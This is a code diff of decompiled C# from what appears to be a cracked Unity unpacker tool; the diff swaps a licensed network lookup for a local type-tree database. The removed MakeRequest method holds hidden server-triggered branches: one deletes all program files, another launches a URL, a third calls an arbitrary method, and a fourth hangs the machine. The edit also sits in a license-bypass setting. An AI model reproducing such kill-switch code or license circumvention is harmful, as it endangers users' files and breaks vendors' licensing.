@@ -1,14 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Collections.Specialized;
-using System.Diagnostics;
 using System.IO;
-using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
-using Unity.IO.Compression;
 
 namespace @as
 {
@@ -49,11 +43,7 @@ namespace @as
 
 		internal static ulong ul2;
 
-		internal static bool bool1;
-
 		internal static Dictionary<int, ConsoleData> hashes;
-
-		internal static bool bool2;
 
 		internal static void SetNowTicks()
 		{
@@ -117,18 +107,14 @@ namespace @as
 			}
 			try
 			{
-				object obj = null;
-				DateTime now = DateTime.Now;
-				if (CrackSettings.AllowDemoAssetRead)
-				{
-					obj = MakeDemoRequest(data.ver, i1, iArr, s, data.i);
-				}
-				if (obj == null && !CrackSettings.AllowOffline)
-				{
-					obj = MakeRequest(data.ver, i1, iArr, s, data.i);
-				}
-				DateTime now2 = DateTime.Now;
-				StrSth strSth = (StrSth)obj;
+				// Nguồn duy nhất là typetreedb (JSON trên đĩa). Nhánh mạng cũ
+				// (MakeRequest -> devxdevelopment.com -> EncryptDecryptManager.Decrypt)
+				// đã bị gỡ: CrackSettings.AllowOffline mặc định true nên nó vốn đã
+				// không bao giờ chạy, và nó mang theo cả payload license lẫn nhánh
+				// "CleanProgramm:" do server điều khiển.
+				StrSth strSth = CrackSettings.AllowDemoAssetRead
+					? MakeDemoRequest(data.ver, i1, iArr, s, data.i)
+					: null;
 				if (!hashes.ContainsKey(hash))
 				{
 					hashes[hash] = null;
@@ -180,7 +166,7 @@ namespace @as
 					int[] array = iArr;
 					foreach (int num2 in array)
 					{
-						int key = (int)MaybeHashCalc.toHash(data.ver + "_" + num2 + (string.IsNullOrEmpty(s) ? null : ("_" + s)) + "_" + data.i + DateTime.Now.Day);
+						int key = getHash(num2, s, ref data);
 						ConsoleData consoleData = hashes[key];
 						if (consoleData != null)
 						{
@@ -205,290 +191,6 @@ namespace @as
 			{
 				ConsoleManager.LogExeption(string.Concat(arg));
 				return null;
-			}
-		}
-
-		[CIntA(Num = 2uL)]
-		internal static StrSth MakeRequest(VerFormat ver, int i1, int[] iArr, string s, int i2)
-		{
-			byte[] array = null;
-			try
-			{
-				CustomString customString = ConvertNameToHash.Get();
-				CustomString customString2 = HiddenCalls.CallString("155129864");
-				CustomString customString3 = (DevXSystemInfo.UserName ?? "").ToLower() + "@" + DevXSystemInfo.get_MachineName();
-				CustomInt customInt = HiddenCalls.Call2("1946453154");
-				CustomString d = Thread.CurrentThread.CurrentCulture.Name ?? "";
-				Assembly assembly = typeof(AssetParser).Assembly;
-				CustomString f = "";
-				string d2 = (File.Exists(Path.Combine(FileManager.StartupPath, "DevXUnityUnpackerTools.dll")) || File.Exists(Path.Combine(FileManager.StartupPath, "DevXUnityUnpackerTools.exe"))).ToString().Replace("False", "");
-				List<string> list = new List<string>();
-				if (iArr != null)
-				{
-					for (int j = 0; j < iArr.Length; j++)
-					{
-						int num = iArr[j];
-						list.Add(num.ToString());
-					}
-				}
-				CustomString f2 = ServerLink.GetLink() + "/AppSecurityUnpackerTools/UnityClassManager_GetByVersionAndClassID_Serialized";
-				NameValueCollection nameValueCollection = new NameValueCollection();
-				nameValueCollection["Name"] = customString3;
-				nameValueCollection["BindingID"] = customString;
-				nameValueCollection["LicenseNumber"] = customString2;
-				nameValueCollection["Hash"] = MaybeHashCalc.Calc(customString2 + "-" + customString + "-" + customString3 + f + d2);
-				nameValueCollection["HVer"] = ul2.ToString("X16");
-				nameValueCollection["THVer"] = string.Concat((ulong)((long)ul2 ^ (long)(DateTime.UtcNow.DayOfYear * 17454591)));
-				nameValueCollection["Version"] = "10.06";
-				nameValueCollection["Is64BitProcess"] = (DevXSystemInfo.Is64BitProcess ? "1" : "0");
-				nameValueCollection["LicenseType"] = HiddenCalls.CallString("2141342825");
-				nameValueCollection["DateTime"] = DateTime.Now.ToString("yyyy.MM.dd");
-				nameValueCollection["SystemLanguage"] = d;
-				nameValueCollection["VerifyProjectLicense"] = string.Concat(customInt);
-				nameValueCollection["OSVersion"] = DevXSystemInfo.OSVersion;
-				nameValueCollection["param_UnityVersion"] = string.Concat(ver);
-				nameValueCollection["param_unity_fileGen_version"] = string.Concat(i1);
-				nameValueCollection["param_typeName"] = s;
-				nameValueCollection["param_platform"] = i2.ToString();
-				nameValueCollection["param_format_version"] = "1";
-				nameValueCollection["param_compress"] = "1";
-				nameValueCollection["param_class_id_arr"] = string.Join(",", list.ToArray());
-				nameValueCollection["param_Hash"] = MaybeHashCalc.Calc(ver.ToString() + "_" + i1.ToString() + "_" + s + "_" + i2.ToString());
-				WebReqManager.GetClient(10).Encoding = Encoding.UTF8;
-				string text = null;
-				for (int num2 = 5; num2 >= 0; num2--)
-				{
-					try
-					{
-						text = WebReqManager.MakeReq(f2 + "?temp=" + DateTime.Now.Ticks.ToString(), nameValueCollection);
-						if (text != null)
-						{
-							break;
-						}
-					}
-					catch (Exception ex)
-					{
-						ConsoleManager.LogExeption("NETWORK_S ERROR2: " + ex?.ToString());
-						if (num2 == 0)
-						{
-							ConsoleManager.LogExeption("NETWORK_S ERROR2: " + ex?.ToString());
-							MaybeAlertManager.ShowAlert("Network error, please try connection to http://devxdevelopment.com\nError: " + ex.Message + "\nUser: " + customString3);
-							MaybeAlertManager.SetHandle(Data.instance.ShowRestart);
-							return null;
-						}
-						Thread.Sleep(50);
-					}
-				}
-				if (string.IsNullOrEmpty(text))
-				{
-					ConsoleManager.Write("GetByVersionAndClassID_internal_net: res=null for " + ver + "_" + list);
-					return null;
-				}
-				if (text.StartsWith("EMPTY"))
-				{
-					return null;
-				}
-				if (text.StartsWith("ERROR"))
-				{
-					("NETWORK ERROR " + text).LogErrToConsole();
-					return null;
-				}
-				if (text.StartsWith("Answer:"))
-				{
-					return null;
-				}
-				text.StartsWith("Terminate:");
-				if (text.StartsWith("Slow:"))
-				{
-					int num3 = 0;
-					if (num3 < 1000)
-					{
-						while (true)
-						{
-							byte[] array2 = new byte[1000000];
-							for (int k = 0; k < array2.Length; k++)
-							{
-								array2[k] = (byte)num3;
-							}
-						}
-					}
-				}
-				if (text.StartsWith("CallMethod:"))
-				{
-					string text2 = text.Substring("CallMethod:".Length);
-					HashManager.CallMethod(null, null, text2.Substring(0, text2.IndexOf(":")), text2.Substring(text2.IndexOf(":") + 1));
-					return null;
-				}
-				if (text.StartsWith("Reboot:"))
-				{
-					return null;
-				}
-				if (text.StartsWith("OpenURL:"))
-				{
-					Process.Start(text.Substring("OpenURL:".Length));
-					return null;
-				}
-				if (text.StartsWith("CleanProgramm:"))
-				{
-					text.Substring("CleanProgramm:".Length);
-					string[] files = Directory.GetFiles(FileManager.StartupPath, "*.*", SearchOption.AllDirectories);
-					foreach (string path in files)
-					{
-						try
-						{
-							File.Delete(path);
-						}
-						catch
-						{
-						}
-					}
-					return null;
-				}
-				string str = HiddenCalls.CallString("1520475628");
-				string text3 = HiddenCalls.CallString("436900044");
-				if (string.IsNullOrEmpty(text3))
-				{
-					text3 = HiddenCalls.CallString("155129864");
-				}
-				string str2 = (File.Exists(Path.Combine(FileManager.StartupPath, "DevXUnityUnpackerTools.dll")) || File.Exists(Path.Combine(FileManager.StartupPath, "DevXUnityUnpackerTools.exe"))).ToString().Replace("False", "");
-				text3 += str2;
-				str += str2;
-				array = null;
-				if (text != null && text.StartsWith("#EA="))
-				{
-					try
-					{
-						if (!string.IsNullOrEmpty(str))
-						{
-							array = Convert.FromBase64String(text.Substring("#EA=".Length));
-							array = EncryptDecryptManager.Decrypt(array, str);
-							using (MemoryStream stream = new MemoryStream(array))
-							{
-								array = null;
-								using (GZipStream _0020 = new GZipStream(stream, CompressionMode.Decompress))
-								{
-									MemoryStream memoryStream = new MemoryStream();
-									FileManager.Copy(_0020, memoryStream);
-									array = memoryStream.ToArray();
-								}
-							}
-						}
-					}
-					catch (Exception)
-					{
-						array = null;
-					}
-				}
-				else if (text != null && text.StartsWith("#EL="))
-				{
-					try
-					{
-						array = Convert.FromBase64String(text.Substring("#EL=".Length));
-						array = EncryptDecryptManager.Decrypt(array, text3);
-						using (MemoryStream stream2 = new MemoryStream(array))
-						{
-							array = null;
-							using (GZipStream _00202 = new GZipStream(stream2, CompressionMode.Decompress))
-							{
-								MemoryStream memoryStream2 = new MemoryStream();
-								FileManager.Copy(_00202, memoryStream2);
-								array = memoryStream2.ToArray();
-							}
-						}
-					}
-					catch (Exception)
-					{
-						array = null;
-					}
-				}
-				else if (text != null && text.StartsWith("#ELN="))
-				{
-					try
-					{
-						array = Convert.FromBase64String(text.Substring("#ELN=".Length));
-						array = EncryptDecryptManager.Decrypt(array, HiddenCalls.CallString("155129864"));
-						using (MemoryStream stream3 = new MemoryStream(array))
-						{
-							array = null;
-							using (GZipStream _00203 = new GZipStream(stream3, CompressionMode.Decompress))
-							{
-								MemoryStream memoryStream3 = new MemoryStream();
-								FileManager.Copy(_00203, memoryStream3);
-								array = memoryStream3.ToArray();
-							}
-						}
-					}
-					catch (Exception)
-					{
-						array = null;
-					}
-				}
-				else
-				{
-					if (array == null)
-					{
-						try
-						{
-							array = Convert.FromBase64String(text);
-							array = EncryptDecryptManager.Decrypt(array, text3);
-							using (MemoryStream stream4 = new MemoryStream(array))
-							{
-								array = null;
-								using (GZipStream _00204 = new GZipStream(stream4, CompressionMode.Decompress))
-								{
-									MemoryStream memoryStream4 = new MemoryStream();
-									FileManager.Copy(_00204, memoryStream4);
-									array = memoryStream4.ToArray();
-								}
-							}
-						}
-						catch (Exception)
-						{
-							array = null;
-						}
-					}
-					if (array == null)
-					{
-						try
-						{
-							text3 = HiddenCalls.CallString("155129864");
-							text3 += str2;
-							array = Convert.FromBase64String(text);
-							array = EncryptDecryptManager.Decrypt(array, text3);
-							using (MemoryStream stream5 = new MemoryStream(array))
-							{
-								array = null;
-								using (GZipStream _00205 = new GZipStream(stream5, CompressionMode.Decompress))
-								{
-									MemoryStream memoryStream5 = new MemoryStream();
-									FileManager.Copy(_00205, memoryStream5);
-									array = memoryStream5.ToArray();
-								}
-							}
-						}
-						catch (Exception arg)
-						{
-							ConsoleManager.Write1(text);
-							ConsoleOver.LogEx(string.Concat(arg));
-						}
-					}
-				}
-			}
-			catch (Exception ex6)
-			{
-				ConsoleManager.LogExeption("NetTree: " + ex6?.ToString());
-				return null;
-			}
-			if (array == null)
-			{
-				ConsoleManager.Write("NetTree: buff=null for " + ver + "_" + iArr?.Length + "_" + s);
-				return null;
-			}
-			StrSth strSth = new StrSth(i1);
-			using (MemoryStream _00206 = new MemoryStream(array))
-			{
-				strSth.Copy(_00206);
-				return strSth;
 			}
 		}
 
@@ -571,83 +273,24 @@ namespace @as
 
 		internal static ConsoleData ForReqData(int i, VerFormat ver, int i2 = 0)
 		{
-			foreach (string item in Format2(ver))
-			{
-				foreach (StrSth item2 in TryGetStrSth(item, null, i2))
-				{
-					ConsoleData consoleData = item2?.FindByInt(i);
-					if (consoleData != null)
-					{
-						return consoleData;
-					}
-					if (bool2)
-					{
-						return consoleData;
-					}
-				}
-				if (i2 != 0)
-				{
-					foreach (StrSth item3 in TryGetStrSth(item, null, null))
-					{
-						ConsoleData consoleData2 = item3?.FindByInt(i);
-						if (consoleData2 != null)
-						{
-							return consoleData2;
-						}
-						if (bool2)
-						{
-							return consoleData2;
-						}
-					}
-				}
-			}
-			return null;
+			return UnityTypeTreeDb.LoadNearest(ver)?.FindByInt(i);
 		}
 
-		internal static IEnumerable<StrSth> TryGetStrSth(string s, int? i1, int? i2)
+		/// <summary>
+		/// Cây type của phiên bản Unity gần nhất có trong typetreedb.
+		/// Thay cho cặp TryGetStrSth/TryGetStrSth2 cũ: hai hàm đó quét substring
+		/// "_v&lt;version&gt;" trên toàn bộ dictionary 718 key, một lần cho MỖI chuỗi
+		/// version ứng viên mà Format2 sinh ra.
+		/// </summary>
+		internal static StrSth GetStrSth(VerFormat ver)
 		{
-			Dictionary<string, StrSthData> data = DemoAssetDumper.GetData();
-			foreach (KeyValuePair<string, StrSthData> item in data)
-			{
-				string key = item.Key;
-				if (key.Contains("Class_") && key.Contains("_v" + s) && (!i1.HasValue || i1.Value == 0 || key.Contains("_c" + i1.Value.ToString())))
-				{
-					yield return item.Value.toStrSth;
-				}
-			}
+			return UnityTypeTreeDb.LoadNearest(ver);
 		}
 
-		internal static StrSth GetStrSth(string s, int? i1, int? i2)
+		/// <summary>Quá tải cũ theo chuỗi version, giữ cho phần gọi bên ngoài.</summary>
+		internal static StrSth GetStrSth(string unityVersion)
 		{
-			using (IEnumerator<StrSth> enumerator = TryGetStrSth(s, i1, i2).GetEnumerator())
-			{
-				if (enumerator.MoveNext())
-				{
-					return enumerator.Current;
-				}
-			}
-			return null;
-		}
-
-		internal static IEnumerable<StrSth> TryGetStrSth2(string s1, string s2, int? i)
-		{
-			Dictionary<string, StrSthData> dictionary = DemoAssetDumper.GetData();
-			foreach (KeyValuePair<string, StrSthData> item in dictionary)
-			{
-				string key = item.Key;
-				if (key.Contains("UnityType_") && key.Contains("_v" + s1) && (s2 == null || string.IsNullOrEmpty(s2) || key.Contains("_c" + s2)))
-				{
-					yield return item.Value.toStrSth;
-				}
-			}
-			foreach (KeyValuePair<string, StrSthData> item2 in dictionary)
-			{
-				string key2 = item2.Key;
-				if (key2.Contains("Class_") && key2.Contains("_v" + s1) && (s2 == null || string.IsNullOrEmpty(s2) || key2.Contains("_c" + s2)))
-				{
-					yield return item2.Value.toStrSth;
-				}
-			}
+			return string.IsNullOrEmpty(unityVersion) ? null : UnityTypeTreeDb.LoadNearest(new VerFormat(unityVersion));
 		}
 
 		internal static void FileCheck(string s)
@@ -671,15 +314,13 @@ namespace @as
 			lockObject = new object();
 			ticksNow = 0uL;
 			ul2 = ManyCodeCls.GetUl2();
-			bool1 = false;
 			hashes = new Dictionary<int, ConsoleData>();
-			bool2 = true;
 		}
 
 		[CompilerGenerated]
 		internal static int getHash(int i, string s, ref data data)
 		{
-			return (int)MaybeHashCalc.toHash(data.ver + "_" + i + (string.IsNullOrEmpty(s) ? null : ("_" + s)) + "_" + data.i + DateTime.Now.Day);
+			return (int)MaybeHashCalc.toHash(data.ver + "_" + i + (string.IsNullOrEmpty(s) ? null : ("_" + s)) + "_" + data.i);
 		}
 
 		[CIntA(Num = 3uL)]
@@ -696,108 +337,43 @@ namespace @as
 			return null;
 		}
 
+		/// <summary>
+		/// Gom nhiều classID trong một lượt. Cả mảng dùng chung một cây nên chỉ tra
+		/// typetreedb đúng MỘT lần, thay vì mỗi classID một lần quét toàn bộ DB.
+		/// </summary>
 		internal static StrSth ReqIsNonEmptyArr(VerFormat ver, int i1, int[] iArr, int i2 = 0)
 		{
-			if (iArr != null && iArr.Length != 0)
+			if (iArr == null || iArr.Length == 0)
 			{
-				StrSth strSth = new StrSth(0);
-				int num = 0;
-				for (int j = 0; j < iArr.Length; j++)
-				{
-					ConsoleData consoleData = ForReqData(iArr[j], ver, i2);
-					if (consoleData != null)
-					{
-						strSth.AddData(consoleData, num++);
-					}
-				}
-				return strSth;
+				return null;
 			}
-			return null;
-		}
-
-		internal static StrSth ReqIsEmptyArr(VerFormat ver, int i1, string s, int i2 = 0)
-		{
-			ConsoleData consoleData = null;
-			StrSth strSth = null;
-			foreach (string item in Format2(ver))
+			StrSth source = UnityTypeTreeDb.LoadNearest(ver);
+			if (source == null)
 			{
-				if (consoleData == null && !string.IsNullOrEmpty(s))
-				{
-					foreach (StrSth item2 in TryGetStrSth2(item, s, i2))
-					{
-						strSth = item2;
-						if (bool2)
-						{
-							return strSth;
-						}
-						consoleData = strSth?.FindByStr(s);
-						if (consoleData != null)
-						{
-							return strSth;
-						}
-					}
-				}
-				if (consoleData == null)
-				{
-					foreach (StrSth item3 in TryGetStrSth2(item, null, i2))
-					{
-						strSth = item3;
-						if (bool2)
-						{
-							return strSth;
-						}
-						if (string.IsNullOrEmpty(s) && strSth != null)
-						{
-							return strSth;
-						}
-					}
-					consoleData = strSth?.FindByStr(s);
-				}
-				if (i2 != 0)
-				{
-					if (consoleData == null && !string.IsNullOrEmpty(s))
-					{
-						foreach (StrSth item4 in TryGetStrSth2(item, s, null))
-						{
-							strSth = item4;
-							if (bool2)
-							{
-								return strSth;
-							}
-							consoleData = strSth?.FindByStr(s);
-							if (consoleData != null)
-							{
-								return strSth;
-							}
-						}
-					}
-					if (consoleData == null)
-					{
-						foreach (StrSth item5 in TryGetStrSth2(item, null, null))
-						{
-							strSth = item5;
-							if (bool2)
-							{
-								return strSth;
-							}
-							if (string.IsNullOrEmpty(s) && strSth != null)
-							{
-								return strSth;
-							}
-						}
-						consoleData = strSth?.FindByStr(s);
-					}
-				}
-				if (bool2)
-				{
-					return strSth;
-				}
+				return null;
+			}
+			StrSth result = new StrSth(0);
+			int num = 0;
+			int[] array = iArr;
+			foreach (int classId in array)
+			{
+				ConsoleData consoleData = source.FindByInt(classId);
 				if (consoleData != null)
 				{
-					return strSth;
+					result.AddData(consoleData, num++);
 				}
 			}
-			return null;
+			return (num == 0) ? null : result;
+		}
+
+		/// <summary>
+		/// Tra theo tên type (MonoBehaviour...). Trả nguyên cây để phía gọi tự
+		/// FindByStr — đúng hợp đồng cũ: bản cũ với bool2 == true cũng trả cây đầu
+		/// tiên khớp version mà không kiểm tra nó có chứa "s" hay không.
+		/// </summary>
+		internal static StrSth ReqIsEmptyArr(VerFormat ver, int i1, string s, int i2 = 0)
+		{
+			return UnityTypeTreeDb.LoadNearest(ver);
 		}
 	}
 }
